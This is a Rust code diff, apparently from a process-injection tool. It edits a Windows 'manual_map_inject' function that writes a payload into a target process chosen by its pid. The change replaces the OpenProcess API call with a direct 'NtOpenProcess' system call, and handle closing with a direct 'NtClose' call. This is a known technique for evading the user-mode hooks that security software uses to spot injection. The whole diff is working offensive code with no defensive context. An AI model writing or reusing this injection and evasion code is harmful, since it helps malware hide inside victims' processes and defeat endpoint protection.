@@ -101,26 +101,34 @@ pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> 
 #[cfg(all(windows, feature = "manual-map"))]
 fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     unsafe {
-        // Open the target process with the access rights required for remote
-        // manual-map: VM operations, VM write, and thread creation.
-        let process = winapi::um::processthreadsapi::OpenProcess(
-            winapi::um::winnt::PROCESS_VM_OPERATION
-                | winapi::um::winnt::PROCESS_VM_WRITE
-                | winapi::um::winnt::PROCESS_VM_READ
-                | winapi::um::winnt::PROCESS_CREATE_THREAD,
-            0, // bInheritHandle = FALSE
-            pid,
+        // Open the target process via NtOpenProcess with the access rights
+        // required for remote manual-map: VM operations, VM write, and thread creation.
+        let mut client_id = [0u64; 2];
+        client_id[0] = pid as u64;
+        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+
+        let mut h_proc: usize = 0;
+        let access_mask = (winapi::um::winnt::PROCESS_VM_OPERATION
+            | winapi::um::winnt::PROCESS_VM_WRITE
+            | winapi::um::winnt::PROCESS_VM_READ
+            | winapi::um::winnt::PROCESS_CREATE_THREAD) as u64;
+        let open_status = nt_syscall::syscall!(
+            "NtOpenProcess",
+            &mut h_proc as *mut _ as u64,
+            access_mask,
+            &mut obj_attr as *mut _ as u64,
+            client_id.as_mut_ptr() as u64,
         );
-        if process.is_null() {
-            return Err(anyhow::anyhow!(
-                "OpenProcess({pid}) failed: {}",
-                std::io::Error::last_os_error()
-            ));
+        match open_status {
+            Ok(s) if s >= 0 && h_proc != 0 => {}
+            _ => return Err(anyhow::anyhow!("NtOpenProcess({pid}) failed")),
         }
+        let process = h_proc as *mut winapi::ctypes::c_void;
         struct HandleGuard(*mut winapi::ctypes::c_void);
         impl Drop for HandleGuard {
             fn drop(&mut self) {
-                unsafe { pe_resolve::close_handle(self.0); }
+                nt_syscall::syscall!("NtClose", self.0 as u64).ok();
             }
         }
         let _guard = HandleGuard(process);
